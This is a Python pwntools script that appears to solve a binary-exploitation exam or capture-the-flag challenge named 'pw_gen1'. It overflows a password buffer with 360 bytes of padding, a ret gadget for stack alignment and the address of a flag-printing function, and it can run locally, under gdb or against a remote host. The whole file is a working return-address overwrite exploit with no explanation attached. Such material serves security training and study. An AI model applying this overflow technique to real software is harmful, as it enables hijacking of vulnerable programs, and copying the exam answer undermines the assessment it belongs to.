#!/usr/bin/env python3
from sys import argv
from pwn import *
import vpn_conf
import re

HOST = args.HOST or vpn_conf.HOST
PORT = int(args.PORT or vpn_conf.BASE_PORT + 13)
EXE_FILENAME = 'bin-exam-2026-01-20/pw_gen1_Federico-Conti'
argv = [EXE_FILENAME]
envp = {}

# thanks Ghidra 
flag_fun = 0x00401196	
OFFSET_RIP = 352+8  # RBP+8 
RET = 0x000000000040101a # ropper --file ./pw_gen1_Federico-Conti --search 'ret'
def start():
    gdbscript = '''
    tbreak *__libc_start_main
    '''
    if args.GDB:
        return gdb.debug(args=argv, env=envp, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process(EXE_FILENAME)

io = start()


payload  = b"a" * (OFFSET_RIP)  
payload += p64(RET)  # stack alignment
payload += p64(flag_fun)
payload += p64(0xdeadbeef)  # ret addr after flag_fun


io.sendlineafter(b'password: ', payload)

io.interactive()
